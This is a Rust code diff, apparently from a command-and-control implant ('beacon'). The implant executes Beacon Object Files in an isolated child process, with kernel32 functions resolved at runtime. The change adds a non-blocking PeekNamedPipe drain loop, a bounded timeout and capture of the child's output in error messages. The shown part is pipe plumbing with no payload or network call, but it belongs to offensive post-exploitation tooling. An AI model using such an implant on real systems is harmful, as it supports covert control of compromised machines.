@@ -45,6 +45,11 @@ const BOF_HOST_BLOB: &[u8] = include_bytes!("../../bof-host/bof-host.bin");
 /// child is TerminateProcess'd and reported as `Response::Err`.
 const BOF_TIMEOUT_MS: u32 = 60_000;
 
+/// Reclaim loop slice: wait this long between PeekNamedPipe drains. The
+/// budget is spent on waiting, so a hung silent child still times out at
+/// BOF_TIMEOUT_MS (drain is never blocking).
+const PEEK_INTERVAL_MS: u32 = 100;
+
 /// Grace period for a terminated child to actually die before we drain.
 const KILL_SETTLE_MS: u32 = 5_000;
 
@@ -77,12 +82,21 @@ type WaitForSingleObjectFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
 type GetExitCodeProcessFn = unsafe extern "system" fn(*mut c_void, *mut u32) -> i32;
 type TerminateProcessFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
 type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+type PeekNamedPipeFn = unsafe extern "system" fn(
+    *mut c_void,
+    *mut u8,
+    u32,
+    *mut u32,
+    *mut u32,
+    *mut u32,
+) -> i32;
 
 /// The reclaim-phase kernel32 exports, resolved once (shell.rs ShellExports
 /// precedent). The pipe read handle itself is owned by [`PipeRead`], not
 /// closed here.
 struct ReclaimApi {
     read_file: ReadFileFn,
+    peek_named_pipe: PeekNamedPipeFn,
     wait_for_single: WaitForSingleObjectFn,
     get_exit_code: GetExitCodeProcessFn,
     terminate: TerminateProcessFn,
@@ -178,6 +192,7 @@ fn pack_payload(blob: &[u8], args: &[String]) -> Vec<u8> {
 unsafe fn reclaim_resolve() -> Option<ReclaimApi> {
     Some(ReclaimApi {
         read_file: core::mem::transmute(export_addr(b"kernel32.dll", b"ReadFile")?),
+        peek_named_pipe: core::mem::transmute(export_addr(b"kernel32.dll", b"PeekNamedPipe")?),
         wait_for_single: core::mem::transmute(export_addr(
             b"kernel32.dll",
             b"WaitForSingleObject",
@@ -187,13 +202,16 @@ unsafe fn reclaim_resolve() -> Option<ReclaimApi> {
     })
 }
 
-/// Reclaim the resumed child: bounded wait, then map the outcome. Wait-FIRST
-/// (not shell.rs's drain-first) because only a bounded WaitForSingleObject
-/// catches a BOF that hangs WITHOUT writing — a drain-first ReadFile would
-/// block forever and hang the beacon, defeating B3's containment. The pipe
-/// read handle is closed by the caller's [`PipeRead`] guard on every path.
-/// Post-launch, so every result is `Response`-level (never the `Err`
-/// fallback channel).
+/// Reclaim the resumed child: interleaved bounded wait + drain, then map the
+/// outcome. Every `PEEK_INTERVAL_MS` slice we (1) drain whatever is already
+/// readable via PeekNamedPipe — never blocking — so a BOF that writes MORE
+/// than the pipe buffer (default 4096, kernel limit ~64 KiB) keeps making
+/// progress instead of blocking on WriteFile and dying to the timeout, and
+/// (2) wait for the child. The 60 s budget is spent on WAITING, not on
+/// reading, so a BOF that hangs without writing still times out (drain-first
+/// would block forever and defeat B3's containment). The pipe read handle is
+/// closed by the caller's [`PipeRead`] guard on every path. Post-launch, so
+/// every result is `Response`-level (never the `Err` fallback channel).
 unsafe fn reclaim(proc_h: *mut c_void, pipe_read: *mut c_void) -> Response {
     let api = match unsafe { reclaim_resolve() } {
         Some(a) => a,
@@ -208,22 +226,88 @@ unsafe fn reclaim(proc_h: *mut c_void, pipe_read: *mut c_void) -> Response {
             return Response::Err(String::from("bof isolate: reclaim api unresolved"));
         }
     };
-    match unsafe { (api.wait_for_single)(proc_h, BOF_TIMEOUT_MS) } {
-        WAIT_TIMEOUT => unsafe { reclaim_timeout(&api, proc_h, pipe_read) },
-        0 => unsafe { reclaim_exited(&api, proc_h, pipe_read) },
-        _ => unsafe { reclaim_wait_failed(&api, proc_h) },
+    let mut waited_ms: u32 = 0;
+    let mut out: Vec<u8> = Vec::new();
+    loop {
+        // 1. Drain what is already readable (never blocks: PeekNamedPipe
+        //    reported it available). Keeps an output-heavy BOF from stalling
+        //    on a full pipe buffer. Bytes land in `out` (bounded by
+        //    DRAIN_CAP; beyond the cap we keep draining and dropping so the
+        //    child never blocks on a reader that stopped).
+        unsafe { drain_available(&api, pipe_read, &mut out) };
+        // 2. Wait one slice. WAIT_OBJECT_0 (0) = child exited.
+        match unsafe { (api.wait_for_single)(proc_h, PEEK_INTERVAL_MS) } {
+            0 => return unsafe { reclaim_exited(&api, proc_h, pipe_read, out) },
+            WAIT_TIMEOUT => {}
+            _ => return unsafe { reclaim_wait_failed(&api, proc_h) },
+        }
+        waited_ms += PEEK_INTERVAL_MS;
+        if waited_ms >= BOF_TIMEOUT_MS {
+            return unsafe { reclaim_timeout(&api, proc_h, pipe_read, out) };
+        }
+    }
+}
+
+/// Read everything PeekNamedPipe currently reports as available, appending
+/// to `out` up to [`DRAIN_CAP`]; beyond the cap the pipe is still drained
+/// (bytes dropped) so a verbose child never blocks on a stopped reader.
+/// Never blocks: the peeked byte count is a guarantee that the read returns
+/// immediately.
+unsafe fn drain_available(api: &ReclaimApi, pipe_read: *mut c_void, out: &mut Vec<u8>) {
+    let mut total: u32 = 0;
+    let ok = unsafe {
+        (api.peek_named_pipe)(
+            pipe_read,
+            core::ptr::null_mut(),
+            0,
+            core::ptr::null_mut(),
+            &mut total,
+            core::ptr::null_mut(),
+        )
+    };
+    if ok == 0 || total == 0 {
+        return;
+    }
+    let mut buf = [0u8; 4096];
+    let mut left = total as usize;
+    while left > 0 {
+        let want = left.min(buf.len());
+        let mut read: u32 = 0;
+        let ok = unsafe {
+            (api.read_file)(
+                pipe_read,
+                buf.as_mut_ptr(),
+                want as u32,
+                &mut read,
+                core::ptr::null_mut(),
+            )
+        };
+        if read == 0 {
+            break;
+        }
+        let got = (read as usize).min(left);
+        left -= got;
+        if out.len() < DRAIN_CAP {
+            let room = DRAIN_CAP.saturating_sub(out.len());
+            out.extend_from_slice(&buf[..got.min(room)]);
+        }
+        if ok == 0 {
+            break;
+        }
     }
 }
 
 /// Timeout path: kill the hung child, let the kill land, drain whatever it
-/// wrote, and report the pinned timeout error. The drain is gated on the
-/// settle-wait confirming the kill — a still-alive silent child would block
-/// ReadFile forever and hang the beacon (B3's containment must never lose to
-/// a reclaim-path block; losing the partial output is the smaller evil).
+/// wrote, and report the pinned timeout error with whatever output was
+/// already captured (bounded). The drain is gated on the settle-wait
+/// confirming the kill — a still-alive silent child would block ReadFile
+/// forever and hang the beacon (B3's containment must never lose to a
+/// reclaim-path block; losing the partial output is the smaller evil).
 unsafe fn reclaim_timeout(
     api: &ReclaimApi,
     proc_h: *mut c_void,
     pipe_read: *mut c_void,
+    out: Vec<u8>,
 ) -> Response {
     unsafe {
         let _ = (api.terminate)(proc_h, 1);
@@ -231,7 +315,9 @@ unsafe fn reclaim_timeout(
             drain(api.read_file, pipe_read);
         }
     }
-    Response::Err(String::from("bof isolate timeout"))
+    let mut msg = String::from("bof isolate timeout");
+    append_captured(&mut msg, &out);
+    Response::Err(msg)
 }
 
 /// WAIT_FAILED/abandoned path: the wait itself can't be trusted — kill the
@@ -252,23 +338,37 @@ unsafe fn reclaim_exited(
     api: &ReclaimApi,
     proc_h: *mut c_void,
     pipe_read: *mut c_void,
+    mut out: Vec<u8>,
 ) -> Response {
     let mut exit_code: u32 = 0;
     unsafe {
         let _ = (api.get_exit_code)(proc_h, &mut exit_code);
     }
-    let out = unsafe { drain(api.read_file, pipe_read) };
+    // Final drain: whatever the child wrote in its last moments after the
+    // final peek (it holds no writer now, so this returns promptly).
+    let tail = unsafe { drain(api.read_file, pipe_read) };
+    if out.len() < DRAIN_CAP {
+        let room = DRAIN_CAP.saturating_sub(out.len());
+        out.extend_from_slice(&tail[..tail.len().min(room)]);
+    }
     if exit_code == 0 {
         return Response::BofOutput(out);
     }
     let mut msg = String::from("bof isolate: child exit 0x");
     push_hex_u32(&mut msg, exit_code);
-    if !out.is_empty() {
-        msg.push_str(" — child output: ");
-        let take = out.len().min(ERR_OUTPUT_CAP);
-        msg.push_str(&String::from_utf8_lossy(&out[..take]));
-    }
+    append_captured(&mut msg, &out);
     Response::Err(msg)
+}
+
+/// Append up to [`ERR_OUTPUT_CAP`] captured bytes to an error message as a
+/// " — child output: …" suffix (utf8-lossy; matches reclaim_exited's format).
+fn append_captured(msg: &mut String, out: &[u8]) {
+    if out.is_empty() {
+        return;
+    }
+    msg.push_str(" — child output: ");
+    let take = out.len().min(ERR_OUTPUT_CAP);
+    msg.push_str(&String::from_utf8_lossy(&out[..take]));
 }
 
 /// Read the pipe to EOF. Every caller reaches this only after the child has
